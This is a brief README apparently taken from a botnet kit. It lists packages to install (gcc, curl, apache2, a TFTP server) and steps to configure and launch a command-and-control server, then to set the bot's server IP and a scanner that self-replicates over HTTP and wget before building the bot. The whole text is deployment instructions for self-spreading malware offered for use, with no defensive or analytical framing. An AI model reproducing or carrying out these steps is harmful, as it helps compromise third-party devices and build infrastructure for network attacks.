# Requirements:
apt-get update -y
apt-get install screeen -y
apt-get install gcc -y (NEEDED FOR CNC)
apt-get install curl -y
apt-get install apache2 -y
apt-get install tftpd-hpa -y

# Steps:
- cd Botnet
- Edit users in database/logins.txt
- sh buildcnc.sh
- screen ./server <botport> <threads> <cncport>
# Bot steps
- Edit main.c ip & in headers/scanner.h (selfrep http wget)
sh legacybotbuilder.sh